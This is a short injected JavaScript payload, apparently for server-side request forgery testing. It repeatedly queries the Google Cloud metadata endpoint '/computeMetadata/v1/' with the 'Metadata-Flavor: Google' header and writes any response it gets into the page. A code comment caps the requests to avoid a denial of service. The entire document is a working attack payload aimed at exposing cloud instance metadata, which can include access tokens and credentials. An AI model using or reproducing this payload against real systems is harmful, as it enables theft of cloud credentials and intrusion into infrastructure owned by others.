<script>
var i=0;
// 10000 requests is plenty, make sure we don't DoS
while (i < 10000){
	var x = new XMLHttpRequest(); 
	x.open("GET", "/computeMetadata/v1/", false); 
	x.setRequestHeader("Metadata-Flavor", "Google");
	x.send();
	if (x.status != 404){
		document.write(x.responseText);
		break
	}
	i++;
}
</script>
